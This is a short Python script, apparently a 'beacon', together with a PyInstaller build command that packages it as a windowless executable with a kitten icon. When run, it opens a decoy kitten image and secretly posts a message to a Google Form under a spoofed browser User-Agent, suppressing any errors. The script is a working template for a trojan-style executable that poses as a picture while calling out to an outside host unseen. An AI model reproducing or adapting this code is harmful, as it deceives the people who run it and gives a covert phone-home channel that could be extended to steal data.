import sys
import requests
import subprocess
from sys import platform

def epistem():
    if platform == "linux" or platform == "linux2":
        file_name = sys._MEIPASS + "/kitten.jpg"
        subprocess.Popen(f"xdg-open {file_name}", shell=True)
        main()
    elif platform == "darwin":
        file_name = sys._MEIPASS + "/kitten.jpg"
        subprocess.Popen(f"open {file_name}", shell=True)
        main()
    elif platform == "win32" or platform == "cygwin":
        file_name = sys._MEIPASS + "\kitten.jpg"
        subprocess.Popen(f"start {file_name}", shell=True)
        main()
        
def main(): 
    data='I am a bot'
    url = 'https://docs.google.com/forms/d/*********************/formResponse'
    form_data = {'entry.1069785764':data}
    user_agent = {'Referer':'https://docs.google.com/forms/d/*********************/viewform','User-Agent': "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.52 Safari/537.36"}
    try:
        r = requests.post(url, data=form_data, headers=user_agent)
    except:
        pass
    
epistem()

# pyinstaller --add-data "path-to/kitten.jpg:." --onefile --windowed --noconsole --icon=path-to-/kitten.icns beacon.py

